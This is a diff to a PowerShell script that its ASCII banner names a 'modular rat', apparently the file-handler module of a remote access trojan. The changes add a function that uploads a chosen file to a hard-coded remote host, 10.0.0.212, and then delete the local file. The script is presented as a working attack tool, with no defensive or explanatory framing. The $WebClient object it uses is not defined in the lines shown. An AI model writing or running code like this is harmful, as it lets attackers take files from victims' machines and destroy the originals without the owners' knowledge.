@@ -1,10 +1,29 @@
-$file_name = $args[0]
+$file_name = If ($args[0]) { $args[0] }else { Write-Error "Please specify the file name..." }
 
-function upload($file_location) {
-
+function title() {
+   Write-Host "
+    _ __ ___   ___   __| |_   _| | __ _ _ __   _ __ __ _| |_
+   | '_ ` _ \ / _ \ / _` | | | | |/ _` | '__| | '__/ _` | __|
+   | | | | | | (_) | (_| | |_| | | (_| | |    | | | (_| | |_
+   |_| |_| |_|\___/ \__,_|\__,_|_|\__,_|_|    |_|  \__,_|\__|
+   " -ForegroundColor DarkGray
+   Write-Host "
+                       Module : File Handler
+   " -ForegroundColor Blue
+   Write-Host "+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++" -ForegroundColor DarkGray
+   Write-Host ""
 }
 
-function findFile {
+
+
+function upload($file_location) {
+   $remote_host = "10.0.0.212"
+   $Dest = "\\$remote_host\$file_location"
+   
+   $WebClient.UploadFile($Dest, $file_location)
+}
+
+function run() {
    $location = ""
    try {
       $location = Get-Item "$file_name" -ErrorAction Stop
@@ -16,14 +35,9 @@ function findFile {
    }
    finally {
       #upload
-      Write-Host "$location"
+      upload($location)
       Remove-Item "$location"
    }
-}
-
-
-function run() {
-   findFile
 }
 
 run
